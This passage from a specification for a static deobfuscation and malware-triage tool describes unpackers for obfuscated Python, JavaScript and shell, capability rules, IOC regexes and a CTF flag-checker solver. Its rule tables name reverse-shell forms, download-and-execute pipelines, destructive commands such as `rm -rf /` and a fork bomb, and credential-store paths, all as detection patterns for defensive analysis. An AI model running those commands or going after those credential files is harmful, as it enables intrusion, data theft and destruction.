after a callable → a call. String/bytes pushes (`STRING`, `BINUNICODE`,
`SHORT_BINUNICODE`, `UNICODE`, `BINBYTES`, …) collected as args.

- Callable in `{os.system, posix.system, nt.system, subprocess.*, builtins.eval,
  builtins.exec, __builtin__.eval, builtins.getattr, builtins.__import__,
  os.popen, pty.spawn}` + `REDUCE` → `T-PICKLE-REDUCE` (high) with
  `"os.system('id')"`-style detail from the most recent string args.
- A string arg passed to `exec`/`eval` → child py layer; to `os.system` /
  `subprocess` → child sh layer.
- Annotation: one block `kind="top-level"`, `name="pickle"`, actions
  "imports callable os.system", "calls os.system('id')", plus the full opcode
  listing under `--deep` (`pickletools.dis` into a `StringIO`, ≤ 400 lines).

#### 7.4.6 Regex fallback (unparseable Python)

If `ast.parse` fails (Python 2 source, truncated payload, syntax tricks): note
`"py: AST parse failed (<msg> line N); regex fallback"` and run regex
detectors: `exec\s*\(?\s*['"]` (py2 statement form), and literal-chain regexes
for families 1, 2, 3, 6 (capture the quoted literal, apply the named
transforms). Children from the fallback get confidence `medium`.

### 7.5 JavaScript unwrapper

#### 7.5.1 Tokenizer (`js_tokenize(text) -> list[Tok]`)

`Tok(kind, value, start, line, col)`, kinds: `str`, `tmpl`, `num`, `ident`,
`punct`, `regex`, `comment` (dropped), `nl`. Handles `'…'`/`"…"` with all JS
escapes (`\xHH`, `\uHHHH`, `\u{H+}`, octal `\0`, line continuations), template
literals (`tmpl` only when no `${`; otherwise a `tmpl` token with
`value=None` → unfoldable), `//` and `/* */` comments, regex-vs-division by the
previous significant token (`ident` except keywords like `return`/`typeof`,
`num`, `)`, `]`, `}` → division; else regex). Unterminated string/comment →
consume to EOF, note. Cap 2 M tokens.

#### 7.5.2 Folder (`JsFolder`)

Recursive descent over tokens, expressions only:
`expr := term ('+' term)*`; `term := primary postfix*`;
`primary := str | num | '(' expr ')' | '[' list ']' | ident | 'new'? ident`;
`postfix := '.' ident | '[' expr ']' | '(' args ')'`.

Whitelisted callables/methods: `atob`, `btoa`, `unescape`, `escape`,
`decodeURIComponent`, `decodeURI`, `String.fromCharCode(...)`,
`String.fromCharCode.apply(<null|String|this|undefined>, [..])`,
`Buffer.from(s, 'base64'|'hex'|'utf8'|'binary').toString(['utf8'|'binary'|'latin1'])`,
`parseInt(s[, radix])`, `Number(s)`; string methods `split(lit)`,
`join(lit)`, `replace(strlit|/literal/flags, strlit)` (regex literal only if it
has no metacharacters other than escaped ones), `slice`, `substr`,
`substring`, `concat`, `charAt`, `toLowerCase`, `toUpperCase`, `trim`,
`toString()`; array methods `reverse()`, `join(lit)`, `map(...)` with
callback forms `x=>String.fromCharCode(x)`, `x=>String.fromCharCode(x^K)`,
`x=>String.fromCharCode(x-K)` / `+K`, `function(x){return String.fromCharCode(x[^+-]K)}`,
`String.fromCharCode` (passed by reference). Names: top-level
`var|let|const NAME = expr;` single assignment (same "unstable" rule as
Python). Everything else → `UNKNOWN`.

#### 7.5.3 Sinks (JS)

`eval(x)`, `window.eval(x)`, `(0, eval)(x)`, `globalThis.eval`, `Function(x)`,
`new Function(x)` / `Function(a, b, body)` (last arg is the body),
`[].constructor.constructor(x)`, `setTimeout(str, …)` / `setInterval(str, …)`,
`document.write(x)` / `document.writeln(x)` / `elem.innerHTML = x` (child lang
`html`), `require('child_process').exec|execSync|spawn(..)` with a folded
string → `sh` (same "transformed or ≥ 200 chars" rule as Python).

#### 7.5.4 Dean Edwards packer (MUST)

Detect `eval\(function\(p,a,c,k,e,[rd]\)`. Locate the call's actual
arguments via the tokenizer: after the function body's matching `}`, expect
`(` `str` `,` `num` `,` `num` `,` `str` `.split` `(` `str('|')` `)` [`,` …] `)`.
Unpack:

```python
ALPH62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
ALPH95 = "".join(chr(i) for i in range(32, 127))   # packer's base95 variant
def unbase(word: str, a: int) -> int | None   # base<=36: int(word, a); <=62: ALPH62; <=95: ALPH95; else None
def unpack(p: str, a: int, c: int, k: list[str]) -> str:
    return re.sub(r"\b\w+\b", lambda m: (k[i] if (i := unbase(m.group(), a)) is not None
                                         and i < len(k) and k[i] else m.group()), p)
```

`c != len(k)` → note, continue (confidence medium). Nested packing (output is
itself packed) is handled naturally by the layer loop. Child `via="eval-packer"`,
`kind="packer(a=<a>)"`.

#### 7.5.5 obfuscator.io / string-array obfuscation (SHOULD)

Detect: ≥ 30 % of distinct identifiers match `_0x[0-9a-f]{4,6}` **and** a
string array of ≥ 10 literals (`var _0x…=[…]` or `function _0x…(){const _0x…=[…];…}`).
Extract the array literals (tokenizer). If ≥ 70 % of entries match
`^[a-zA-Z0-9+/=]+$` and decode with the obfuscator's alphabet
`abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=` (base64
with swapped case, then `%`-decode as `decodeURIComponent`) to ≥ 90 %
printable, use the decoded strings. If the decoder function contains
`% 0x100` / `%256` and a second parameter (RC4 variant), do **not** decode;
tell `T-JS-STRING-TABLE-RC4` ("needs dynamic evaluation"). Output: an
`embedded` child layer of lang `text` holding the string table (one entry per
line, header line "string table (N entries; order may be rotated)"), so IOCs
and capability string rules run on it. Never claims a string→call-site mapping.

#### 7.5.6 HTML layers

Extract `<script>…</script>` bodies (case-insensitive, regex, no HTML parser
needed) → child js layers; `on\w+="…"` handler attributes → one combined js
layer; `<iframe src=…>` / `<form action=…>` URLs → IOCs.

#### 7.5.7 Detect-only JS encodings (MUST detect, MUST NOT claim decode)

| family | detector | tell |
|---|---|---|
| JSFuck | ≥ 95 % of non-whitespace chars in `[]()!+` and length ≥ 200 | `T-JSFUCK` high, "not statically decoded" |
| aaencode | contains `ﾟωﾟﾉ` or `(ﾟДﾟ)` | `T-AAENCODE` high |
| jjencode | `^\s*\w+=~\[\];\s*\w+=\{___:\+\+` | `T-JJENCODE` high |

#### 7.5.8 Minified JS view

If a JS layer has max line length > 500 and < 10 lines, build a **pretty view**
from the token stream (newline after `;` `{` `}` outside parens, indent by
brace depth, 2 spaces) and store it in `layer.view`. Annotation line refs then
refer to the view and use loc form `L<n>v:<line>` (`v` = view). `--dump-layers`
writes `.pretty.js`. Without the view, locs use `L<n>:<line>:c<col>` when the
line is > 200 chars.

### 7.6 Shell unwrapper

#### 7.6.1 Splitting

1. Logical lines: join `\`-newline continuations; capture heredocs
   (`<<[-]?\s*['"]?(\w+)['"]?` → body until a line equal to the word, tab-stripped
   for `<<-`).
2. Split commands on unquoted `;`, `&&`, `||`, `&`, newline; split pipelines on
   unquoted single `|`. Quote/escape tracking: `'…'`, `"…"` (with `\`),
   `$'…'` (ANSI-C), backticks, `$( … )` with nesting depth.
3. Per command: `shlex.split(cmd, posix=True)` inside `try/except ValueError`
   (fallback: whitespace split), after resolving variables (§7.6.2) and
   ANSI-C strings (`\xHH`, `\NNN`, `\n`, `\t`, `\\`, `\'`).

#### 7.6.2 Variables

Top-level `NAME=literal` (no spaces, quoted or unquoted, ANSI-C allowed) bind
names; `$NAME` / `${NAME}` substitution in later commands. `${IFS}` / `$IFS` →
space. Assignment inside `if`/loop/function → unstable. `export NAME=...` same
as assignment. Command substitutions `$(…)` / backticks are folded only when
the inner command is a resolvable pipeline (§7.6.3); otherwise left verbatim.

#### 7.6.3 Pipeline folding

`source → transform* → sink`.

- **Sources**: `echo [-n] [-e] args…` (`-e` interprets escapes),
  `printf FMT [args]` (only `%s`, `%b`, `%%` and escapes; other specifiers →
  unknown), `cat <<EOF` heredoc, `cmd <<< "str"`, `cat` of a variable? no —
  `printf '%s' "$VAR"`/`echo "$VAR"` with a resolved var.
- **Transforms**: `base64 -d|--decode|-D|-di`, `base32 -d`, `xxd -r -p` /
  `xxd -p -r`, `gzip -d[c]`, `gunzip [-c]`, `zcat`, `bzip2 -d[c]`, `bzcat`,
  `xz -d[c]`, `xzcat`, `rev` (per line), `tr SET1 SET2` (literal sets with
  `a-z` ranges, incl. rot13 `'A-Za-z' 'N-ZA-Mn-za-m'`), `openssl base64 -d`,
  `openssl enc -base64 -d` / `-d -base64` / `-a -d`, `sed 's/X/Y/g'` where X
  and Y contain no regex metacharacters (SHOULD).
- **Sinks**: `sh|bash|zsh|dash|ash|ksh` (no script arg, or `-s`, or `-`),
  `source /dev/stdin`, `. /dev/stdin`, `python[23]? [-]`, `perl`, `php`,
  `node` (child lang by interpreter; perl/php children get lang `text`).
- **Wrapper sinks**: `eval "<expr>"`, `eval "$(<pipeline>)"`,
  `bash -c "<expr>"` / `sh -c`, `python3 -c "<expr>"`, `node -e "<expr>"`,
  `perl -e`.
- `curl|wget … | sh` (or `bash <(curl …)`, `sh -c "$(curl …)"`): **not**
  unwrapped; `T-DOWNLOAD-EXEC` (high) + URL IOC.

A pipeline with a resolvable source and ≥ 1 transform but no sink (e.g. output
redirected `> /tmp/x`) → `embedded` child layer (`via="embedded"`) when the
result passes the §7.2 embedded rule; the redirect target is a FILE_WRITE IOC.

#### 7.6.4 Shell families that MUST unwrap

1. `echo <b64> | base64 -d | bash` (and `-di`, `--decode`, `| sh`).
2. `bash -c "$(echo <b64> | base64 --decode)"` and `eval "$(… )"`.
3. `echo <hex> | xxd -r -p | sh`.
4. `echo <b64> | base64 -d | gunzip | bash`.
5. `printf '\x65\x63…' | sh` and `$'\x65…'` ANSI-C strings passed to `eval`.
6. Variable-split commands: `a=ba;b=se64;c=bash; echo X | $a$b -d | $c`.

#### 7.6.5 Python / Perl one-liners

`python3 -c "<code>"` → child py layer (code folded from the quoted arg),
annotated with the Python annotator.

#### 7.6.6 PowerShell (SHOULD — unwrap only)

`powershell|pwsh … -e|-enc|-EncodedCommand <b64>` → base64 → UTF-16LE → child
`ps1` layer. `IEX`/`Invoke-Expression` of
`[Text.Encoding]::(UTF8|Unicode|ASCII).GetString([Convert]::FromBase64String('…'))`
→ child `ps1`. `ps1` layers are annotated with the generic annotator (§7.9.5)
plus the ps1 rows of the capability table.

### 7.7 Whole-blob decoders (generic)

For `blob`/`data`/`text` layers and as a last resort for any layer whose
stripped content has no whitespace and length ≥ 32: try in order, take the
**first** that yields a valid result:

gzip / zlib / bz2 / xz magics → decompress; pickle header → §7.4.5;
`.pyc` magic → §7.4.4; whole-string base64 (`decode.b64_decode`, result
printable ≥ 0.85 or a known magic) → decode; whole-string hex
(`decode.hex_decode`) → decode; reversed base64 (`text[::-1]`) → decode;
`decode.auto_decode(text, max_rounds=4)` as the final attempt, accepted only if
the chain is non-empty and the result is `decode.plaintext_like` or has a known
magic. `via="whole-file"`, `kind` = chain.

### 7.8 Obfuscation measures (tells, not layers)

Computed on every textual layer:

| measure | definition | tell (threshold) |
|---|---|---|
| rename density | distinct identifiers (py: AST `Name`/`arg`/`FunctionDef` names; js/sh: tokens/vars) matching `^_+$`, `^[Il1O0_]{4,}$`, `^_0x[0-9a-fA-F]{3,}$`, `^[a-zA-Z_]\w{9,}$` with vowel ratio < 0.15, or `^(?:_{1,2}[a-zA-Z]?){1,3}\d*$`, over all distinct identifiers (≥ 8 identifiers needed) | `T-RENAME-DENSITY` medium ≥ 0.40, low ≥ 0.20 |
| concat splitting | max number of string literals joined by `+` in one expression (or `+=` chain on one name) | `T-CONCAT-SPLIT` low ≥ 4 pieces, medium ≥ 12 |
| char-code arrays | int list literals, len ≥ 8, all in 0..0x10FFFF, decoding to ≥ 90 % printable | `T-CHARCODE-ARRAY` low; decoded text → IOC scan (tag `decoded`) |
| escape density | `\x`/`\u`/`\NNN` escapes per source char in string literals | `T-ESCAPE-DENSITY` low ≥ 0.25 |
| long literal | single string literal ≥ 1 KiB | `T-LONG-LITERAL` info |
| dynamic attribute | `getattr(x, <non-literal or folded-split>)`, JS `obj[<expr>]` call with folded name | `T-GETATTR-STRING` medium (detail shows the resolved name) |
| dynamic import | `__import__`, `importlib.import_module`, JS `require(<non-literal>)` | `T-IMPORT-DYNAMIC` medium |

Encoded literals that are **not** layers (decoded size < 64 B, e.g.
`base64.b64decode('aHR0cDovL...')` → a short URL) are reported inline: the
folded value is attached to the evidence snippet (`b64decode('aHR0…') = 'http://…'`)
and fed to the IOC extractor with tag `decoded`.

### 7.9 Annotator ("what each part does")

#### 7.9.1 Segmentation

**Python** (AST of `layer.view or layer.text`):

- one `imports` block for all top-level `Import`/`ImportFrom` (start = first,
  end = last import line; actions list imported modules that map to categories,
  e.g. "imports socket, subprocess");
- each top-level `FunctionDef` / `AsyncFunctionDef` → `function`;
  each `ClassDef` → `class`, each method inside → `method` (`Class.meth`);
- `if __name__ == "__main__":` → `main-guard`;
- maximal runs of other consecutive top-level statements → `top-level`
  (name `""`, lines `a–b`). A run longer than 40 lines is split at blank-line
  boundaries.

**JavaScript** (tokens of view): function declarations; `const|let|var NAME =
function…/(…)=>{…}`; `class` and its methods; IIFEs `(function(){…})()` /
`(()=>{…})()` → `iife`; object-literal methods `name: function(){…}`/`name(){…}`
inside a top-level object assigned to a name (`Obj.name`); remaining top-level
statement runs → `top-level`. Brace matching via the token stream.

**Shell**: `name() {…}` / `function name {…}` → `shell-function`;
`if…fi`, `case…esac` → `conditional`; `for|while|until…done` → `loop`
(top-level only; nested ones belong to their parent); remaining command runs
(split on blank lines) → `top-level`.

**pyc**: §7.4.4. **pickle**: §7.4.5. **ps1/text/html**: §7.9.5.

#### 7.9.2 Capability rules (`CAP_RULES`)

A table of `Rule(id, lang, category, severity, match, phrase)`.
`match` kinds: `call` (Python: fully-qualified callee after alias resolution,
fnmatch pattern; JS: dotted callee text or `new X`; shell: argv[0] basename),
`string` (regex on folded string constants / argv), `token` (regex on raw
source line for constructs the parser does not model). `phrase` is a format
string; `{arg}` = first folded literal argument (truncated 60, or
`<dynamic>`), `{argv}` = shell argv joined (truncated 60).

Python alias resolution: `import socket as s` → `s.socket` ⇒ `socket.socket`;
`from os import system as x` → `x` ⇒ `os.system`; attribute chains on
instances are matched by method name when the receiver is unknown and the
module was imported (`s.connect(...)` after `import socket` ⇒ rule `*.connect`
with `socket` imported). Keep it simple and documented: instance-method rules
fire only when their module is imported in the same layer.

MUST rows (implementer may add more; every row needs `id`, `severity`,
`phrase`):

| id | lang | category | sev | match | phrase |
|---|---|---|---|---|---|
| PY-EXEC-DYN | py | DYNAMIC_CODE | high | call `exec`, `eval`, `compile`, resolved getattr exec | `executes dynamic code ({arg})` |
| PY-SUBPROC | py | EXEC | medium | call `os.system`, `os.popen`, `os.exec*`, `os.spawn*`, `subprocess.*`, `pty.spawn`, `commands.getoutput` | `runs command {arg}` |
| PY-SOCKET | py | NETWORK | medium | call `socket.socket`, `socket.create_connection`; method `connect`/`connect_ex`/`bind`/`listen`/`send*`/`recv*` with socket imported | `opens socket` / `connects to {arg}` / `listens on {arg}` / `sends data` / `receives data` |
| PY-HTTP | py | NETWORK | medium | `urllib.request.*`, `urllib2.*`, `requests.*`, `http.client.*`, `httpx.*`, `aiohttp.*`, `ftplib.*`, `smtplib.*`, `paramiko.*` | `HTTP/remote request to {arg}` |
| PY-DOWNLOAD-EXEC | py | DOWNLOAD | high | a value from a PY-HTTP call flowing (same block, by variable name) into a sink | `downloads and executes code from {arg}` |
| PY-OPEN-R / PY-OPEN-W | py | FILE_READ / FILE_WRITE | low / medium | `open(path, mode)` (mode literal; default `r`; `w`/`a`/`x`/`+` → write), `pathlib.Path(...).read_*`/`write_*`, `shutil.copy*` | `reads file {arg}` / `writes file {arg}` |
| PY-DELETE | py | FILE_DELETE | medium | `os.remove`, `os.unlink`, `shutil.rmtree`, `Path.unlink` | `deletes {arg}` |
| PY-CRYPTO | py | CRYPTO | low | `hashlib.*`, `hmac.*`, `Crypto.*`, `Cryptodome.*`, `cryptography.*`, `nacl.*`, `secrets.*`; XOR in a loop over bytes (AST: `BinOp(BitXor)` inside a comprehension/for over a bytes/str) | `hashes/encrypts with {callee}` / `XORs data with {key}` |
| PY-ENCODE | py | ENCODING | info | `base64.*`, `binascii.*`, `codecs.*`, `zlib.*` (non-sink use) | `encodes/decodes data ({callee})` |
| PY-INPUT | py | INPUT | info | `input`, `raw_input`, `sys.argv`, `sys.stdin.*`, `getpass.getpass` | `reads user input` |
| PY-RECON | py | RECON | low | `platform.*`, `os.uname`, `socket.gethostname`, `getpass.getuser`, `os.getlogin`, `os.environ`, `os.getuid` | `collects host info ({callee})` |
| PY-ANTIDBG | py | ANTI_ANALYSIS | medium | `sys.gettrace`, `sys.settrace`, `'pydevd' in sys.modules`, `ctypes…IsDebuggerPresent`, `time.sleep(N≥30)` | `checks for debugger/tracing` / `sleeps {arg}s` |
| PY-CTYPES | py | MEMORY_EXEC | high | `ctypes.*VirtualAlloc*`, `ctypes.CDLL(...).mmap/mprotect`, `ctypes.memmove` + `CFUNCTYPE` | `allocates/executes native memory` |
| PY-REG | py | PERSISTENCE | high | `winreg.SetValue*` / `_winreg.*` on a Run key | `writes registry Run key {arg}` |
| JS-FETCH | js | NETWORK | medium | `fetch`, `XMLHttpRequest`, `navigator.sendBeacon`, `new WebSocket`, `$.ajax/$.get/$.post`, `axios.*`, `http(s).request/get`, `net.connect`, `new Image().src=` | `sends request to {arg}` |
| JS-CHILD | js | EXEC | high | `child_process.*` (exec, execSync, spawn, fork) incl. `require('child_process')` | `runs command {arg}` |
| JS-FS | js | FILE_READ/WRITE/DELETE | low/medium/medium | `fs.readFile*`, `fs.writeFile*`, `fs.appendFile*`, `fs.unlink*`, `fs.rm*` | as py |
| JS-COOKIE | js | CREDENTIALS | high | `document.cookie`, `localStorage`, `sessionStorage`, `indexedDB`, `navigator.credentials` | `reads browser storage ({callee})` |
| JS-DOM-REDIRECT | js | OUTPUT | low | `window.location=`, `location.href=`, `document.write`, `innerHTML=` | `rewrites page / redirects` |
| JS-EVAL | js | DYNAMIC_CODE | high | sinks of §7.5.3 | `executes dynamic code` |
| JS-DEBUGGER | js | ANTI_ANALYSIS | medium | `debugger` statement inside a loop / `setInterval`; `Function("debugger")` | `anti-debug: debugger trap` |
| JS-CRYPTO | js | CRYPTO | low | `crypto.subtle.*`, `CryptoJS.*`, `require('crypto')`, `createCipher*`, `createHash` | `uses crypto ({callee})` |
| JS-ENV | js | RECON | low | `process.env`, `os.hostname`, `os.userInfo`, `navigator.userAgent` | `collects host/browser info` |
| SH-NET | sh | NETWORK | medium | `curl`, `wget`, `nc`, `ncat`, `socat`, `telnet`, `ssh`, `scp`, `ftp`, string `/dev/tcp/`, `/dev/udp/` | `network: {argv}` |
| SH-REVSHELL | sh | EXEC | high | `bash -i >& /dev/tcp/…`, `nc -e`, `ncat -e`, `mkfifo … nc`, `socat exec:` | `reverse shell to {arg}` |
| SH-PERSIST | sh | PERSISTENCE | high | `crontab`, `/etc/cron*`, `systemctl enable`, `*.service` writes, `>> ~/.bashrc\|.profile\|.zshrc`, `/etc/rc.local`, `authorized_keys`, `/etc/ld.so.preload` | `persistence via {what}` |
| SH-PRIVESC | sh | PRIVESC | medium | `sudo`, `chmod [ugo]*+s`/`chmod 4755`, `setcap`, `/etc/sudoers` | `privilege change: {argv}` |
| SH-DESTRUCT | sh | DESTRUCTIVE | high | `rm -rf /`-ish (`rm` with `-r` and `-f` on `/`, `~`, `*`), `shred`, `dd of=/dev/`, `mkfs`, `:(){ :\|:& };:` | `destructive: {argv}` |
| SH-ANTIFOR | sh | ANTI_ANALYSIS | medium | `history -c`, `unset HISTFILE`, `HISTFILE=/dev/null`, `> /var/log/*`, `rm *.log`, `touch -r` | `covers tracks: {argv}` |
| SH-RECON | sh | RECON | low | `id`, `whoami`, `uname`, `hostname`, `ifconfig`, `ip a`, `cat /etc/passwd`, `ps`, `env` | `recon: {argv}` |
| SH-FILES | sh | FILE_WRITE / FILE_DELETE | medium | redirections `>`/`>>` to a path, `tee`, `cp`, `mv`, `rm`, `chmod +x` | `writes {path}` / `deletes {path}` / `makes executable {path}` |
| SH-CRYPTO | sh | CRYPTO | low | `openssl enc`, `gpg`, `sha*sum`, `md5sum` | `crypto: {argv}` |
| SH-BG | sh | EXEC | low | `nohup`, `setsid`, trailing `&`, `disown` | `runs in background` |
| PS-IEX | ps1 | DYNAMIC_CODE | high | `IEX`, `Invoke-Expression`, `[ScriptBlock]::Create` | `executes dynamic code` |
| PS-NET | ps1 | NETWORK | medium | `Invoke-WebRequest`, `iwr`, `Net.WebClient`, `DownloadString`, `DownloadFile`, `Invoke-RestMethod` | `downloads from {arg}` |
| ANY-PERSIST-STR | * | PERSISTENCE | high | string: `/etc/cron`, `crontab`, `\.bashrc`, `\.profile`, `rc\.local`, `systemd/system`, `authorized_keys`, `CurrentVersion\\Run`, `Start Menu\\Programs\\Startup`, `LaunchAgents` | `references persistence location {arg}` |
| ANY-CRED-STR | * | CREDENTIALS | high | string: `/etc/shadow`, `id_rsa`, `\.ssh/`, `\.aws/credentials`, `Login Data`, `cookies\.sqlite`, `\.git-credentials`, `wallet\.dat`, `\.kdbx`, `keychain` | `references credential store {arg}` |
| ANY-RECON-STR | * | RECON | low | string: `/etc/passwd`, `/proc/version`, `/etc/os-release` | `references {arg}` |

Rules fire per block; evidence = every matching site (`loc`, snippet, rule id).
A rule that matches a *string* rule inside an already-matched call does not
double-count.

#### 7.9.3 Block summary (`_summarise_block`)

```
<kind> `<name>` (<loc range>): <action 1>; <action 2>; …[; +N more]. calls: a(), b()
```

- `<loc range>`: `L2:12-30` (or `L2v:12-30` for views).
- Actions: phrases from fired rules in **source order**, de-duplicated by
  final text, max 6 in compact mode (all in `--deep`). No rule fired →
  `"no notable operations (pure computation / glue)"` (+ `"defines N
  functions"` for top-level runs that only define things, `"returns <expr
  kind>"` for one-statement functions).
- `calls`: intra-file callees (Python: `Call` targets that are top-level
  function/class names defined in the same layer; JS: same; shell: function
  names invoked), max 6.
- `categories` = union of fired rule categories.
- Block confidence = `high` if every action came from a resolved call/string
  rule, `medium` if any came from an instance-method or token rule, `low` if the
  block was segmented by the shell blank-line fallback only.

Additionally the layer gets a **flow line** (SUMMARY section): ordered
categories of the entry-point path — Python: `main-guard` block, else
top-level runs, following intra-file calls depth ≤ 3; JS: top-level + IIFEs;
shell: top-level. Example: `flow: INPUT -> COMPARE_CHECK -> OUTPUT` or
`flow: RECON -> NETWORK(10.13.37.5:4444) -> PERSISTENCE(~/.bashrc)`.

#### 7.9.4 Cleaned view (Python, `--deep` / `--dump-layers`)

`ast.NodeTransformer` that replaces every **closed** foldable expression
(foldable without env lookups other than whitelisted modules) whose folded
value is `str`/`bytes`/`int` and ≤ 4 096 chars with an `ast.Constant`; then
`ast.unparse` (3.9+). With `--rename`, identifiers flagged by the rename-density
classifier (§7.8) are renamed consistently: functions `func_1…`, classes
`Class_1…`, params/vars `var_1…`, preserving builtins, imports, attributes, and
dunder names. The cleaned view is **presentation only**: tells and blocks keep
referencing `layer.text` lines (Python views do not change `layer.view`).
On `ast.unparse` failure: note, no view.

#### 7.9.5 Generic annotator (ps1, text, html, regex fallback)

Blocks = blank-line-separated chunks (`kind="top-level"`, confidence low); rules
of type `string` + `token` for `*` and the layer's lang; IOCs + tells as usual.

### 7.10 Checker solver (CTF flag checkers) — MUST for (a)–(c), SHOULD for (d)–(f)

Python AST only (JS: §7.10.2). Purpose: many CTF "reversing" scripts are flag
checkers. When the check is a trivially invertible transform of the input
compared to a constant, compute the input.

**Input-derived names**: function parameters, names assigned from `input()`,
`raw_input()`, `sys.argv[n]`, `sys.stdin.read*()`, `getpass.getpass()`, and
names assigned from `.encode()`/`.strip()`/`list()` of those.

**Element transform** `F(x, i)` is a chain (≤ 4 ops) over `ord(x)` / byte `x`
with ops from: `^ K`, `+ K`, `- K`, `^ i`, `+ i`, `- i`, `^ (i + K)`,
`^ key[i % len(key)]` (key literal str/bytes/list), `% 256`, `& 0xff`,
`(<<|>>) n` combined rotate `((x << n) | (x >> (8-n))) & 0xff`. Inverse is
applied in reverse order modulo 256.

Patterns:

- (a) `[F(c) for c in X] == CONST_LIST` / `list(map(lambda c: F(c), X)) == CONST`,
  and `[F(X[i], i) for i in range(len(X))] == CONST`.
- (b) loop: `for i in range(len(X)): if F(X[i], i) != CONST[i]: <fail>` (also
  `for i, c in enumerate(X)` and `==` with else-fail), CONST from env.
- (c) direct: `X == "lit"`, `X[::-1] == "lit"`, `X.encode() == b"lit"`,
  `base64.b64encode(X.encode()) == b"..."` (decode the constant),
  `codecs.encode(X, 'rot13') == "..."`, `X == <foldable expr>` (fold it).
- (d) hashing: `hashlib.<alg>(X…).hexdigest() == "<hex>"` → Checker with
  `candidate=""`, `method="<alg> hash"`, detail "crack with `recon.py hashid
  crack <hex>`" (no cracking here).
- (e) per-char direct: `X[0] == 'f' and X[1] == 'l' …` or chained
  `if X[i] != 'c': fail` with literal indices → assemble by index.
- (f) length check `len(X) == N` recorded in `detail`.

Acceptance of a candidate: printable ratio ≥ 0.9; confidence `high` if it
matches a flag regex, else `medium`. A `Checker` always also emits tell
`T-CHECKER` (info). Candidate strings are added to `summary.flags` only if they
match a flag regex.

#### 7.10.2 JS (SHOULD)

Regex-level: `(\w+)\.charCodeAt\(\s*(\w+)\s*\)\s*([\^+\-])\s*(0x[0-9a-fA-F]+|\d+)\s*!==?\s*(\w+)\[\s*\2\s*\]`
plus the array literal bound to group 5 (tokenizer) → invert. Direct
`if (x === "lit")` → candidate.

---

## 8. Shared analysis

### 8.1 IOC extraction (`extract_iocs`)

Runs on: every layer's text, every folded string constant (tag `decoded`
when ≥ 1 transform applied), reversed copies of literals ≥ 16 chars (tag
`reversed`, only kept if the reversed string yields a URL/flag IOC), char-code
array decodes, pyc constant strings, pickle string args, and (binary lane)
extracted strings (tag `from-binary`). De-duplicate on `(type, value)`; keep
the first `loc` and count the rest in `context` ("+3 more").

| type | regex / rule | confidence |
|---|---|---|
| `url` | `\b(?:https?\|ftps?\|wss?\|tcp\|udp\|file)://[^\s'"<>\`)\]]{3,}` (strip trailing `.,;`) | high |
| `ip` / `ip_port` | `(?<![\d.])(\d{1,3}(?:\.\d{1,3}){3})(?::(\d{1,5}))?(?![\d.])`, each octet ≤ 255, port ≤ 65535; tags (fixed ranges, do **not** use `ipaddress.is_private`): `private` = 10/8, 172.16/12, 192.168/16; `loopback` 127/8; `link-local` 169.254/16; `multicast` 224/4; `doc` = 192.0.2/24, 198.51.100/24, 203.0.113/24 (doc ranges are *not* private — CTFs use them as fake C2s); drop `0.0.0.0` unless in a bind/connect call (then tag `any`); drop if the source token looks like a version (`[vV]` or `version` within 8 chars before) | high (medium if it only appears in a comment) |
| `ip` (tuple) | Python `("1.2.3.4", 4444)` / JS `{host:"…", port: N}` adjacent literals → `ip_port` | high |
| `domain` | host part of URLs; plus bare `[a-z0-9-]+(\.[a-z0-9-]+)*\.(com\|net\|org\|io\|ru\|cn\|xyz\|top\|info\|biz\|cc\|tk\|onion\|me\|co\|dev\|app\|site\|online\|club)` only inside string literals | high (URL host) / low (bare) |
| `email` | `[\w.+-]+@[\w-]+\.[\w.-]+` inside strings | medium |
| `path` | `(?:~\|/(?:etc\|tmp\|var\|home\|root\|usr\|bin\|sbin\|dev\|proc\|opt\|lib\|lib64\|sys\|run\|mnt\|srv\|boot))(?:/[\w.\-+@%]+)+/?`; `~/` paths | medium (high when the string is the arg of a file/exec rule) |
| `winpath` | `[A-Za-z]:\\\\(?:[^\\\\/:*?"<>\|\r\n]+\\\\)*[^\\\\/:*?"<>\|\r\n]*`, `%(APPDATA\|TEMP\|USERPROFILE\|PROGRAMDATA)%\\\\…` | medium |
| `registry` | `(HKEY_[A-Z_]+\|HKLM\|HKCU\|HKCR\|HKU)\\\\[^\s'"]+` | high |
| `flag` | `FLAG_RE` + `--flag-format`; also on decoded/reversed literals | high (medium when only in a reversed copy) |
| `key_pem` | `-----BEGIN [A-Z ]*(PRIVATE KEY\|RSA\|OPENSSH\|PGP)[A-Z ]*-----` | high |
| `aws_key` | `\b(AKIA\|ASIA)[0-9A-Z]{16}\b` | high |
| `jwt` | `\beyJ[\w-]{8,}\.eyJ[\w-]{8,}\.[\w-]{8,}\b` | high |
| `tg_token` | `\b\d{8,10}:[A-Za-z0-9_-]{35}\b` | medium |
| `hex_secret` | standalone hex literal of 32/40/64/128 chars (`hash or key?`) | low |
| `secret_assign` | Python/JS/sh assignment where target name matches `(?i)(key\|secret\|passw(or)?d\|pwd\|token\|iv\|salt\|api_?key)` and value is a literal ≥ 4 chars | medium |
| `b64_blob` | literal ≥ 40 chars, base64 alphabet, decodes (`decode.b64_decode`) but not consumed as a layer — value shown truncated + decoded preview | low |

### 8.2 Crypto constants (`CRYPTO_CONSTS`, `scan_crypto_constants`)

Shared by both lanes. Each entry: `(name, mode, patterns, confidence)`.
`table` mode: contiguous byte pattern (search all of `data`; `bytes.find` loop,
capped hits). `imm` mode: individual little-endian u32/u64 values; a hit
requires ≥ 2 **distinct** members of the set within a 256-byte window
(`medium`), except entries marked *distinctive* where 1 hit is `low`.
Also search big-endian packings for `table` entries of u32 arrays
(`confidence` one level lower, tag `BE`).

| name | mode | pattern(s) | conf |
|---|---|---|---|
| AES S-box | table | `63 7c 77 7b f2 6b 6f c5 30 01 67 2b fe d7 ab 76` | high |
| AES inverse S-box | table | `52 09 6a d5 30 36 a5 38 bf 40 a3 9e 81 f3 d7 fb` | high |
| AES T-table (Te0) | table | `a5 63 63 c6 84 7c 7c f8` | high |
| AES Rcon | table | `01 02 04 08 10 20 40 80 1b 36` | medium |
| SHA-256 IV | table + imm | u32 `0x6a09e667 0xbb67ae85 0x3c6ef372 0xa54ff53a` | high (table) |
| SHA-256 K | table + imm | u32 `0x428a2f98 0x71374491 0xb5c0fbcf 0xe9b5dba5` | high |
| SHA-512 IV | table + imm | u64 `0x6a09e667f3bcc908 0xbb67ae8584caa73b` | high |
